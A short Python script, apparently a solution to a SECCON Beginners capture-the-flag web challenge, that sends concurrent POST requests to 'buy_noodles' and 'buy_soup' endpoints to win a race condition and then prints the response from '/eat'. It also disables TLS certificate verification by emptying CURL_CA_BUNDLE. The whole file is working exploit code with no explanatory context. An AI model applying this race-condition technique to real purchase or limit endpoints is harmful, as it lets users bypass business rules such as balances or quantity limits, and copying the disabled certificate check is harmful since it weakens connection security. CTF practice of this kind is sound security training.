import requests
import concurrent.futures

import os
os.environ['CURL_CA_BUNDLE'] = ''


s = requests.Session()
s.get("https://cant-use-db.quals.beginners.seccon.jp/")

def request_post(url):
    s.post(url)


with concurrent.futures.ThreadPoolExecutor(max_workers=5) as e:
    e.submit(request_post, "https://cant-use-db.quals.beginners.seccon.jp/buy_noodles")
    e.submit(request_post, "https://cant-use-db.quals.beginners.seccon.jp/buy_noodles")
    e.submit(request_post, "https://cant-use-db.quals.beginners.seccon.jp/buy_soup")

r = s.get("https://cant-use-db.quals.beginners.seccon.jp/eat")
print(r.text)
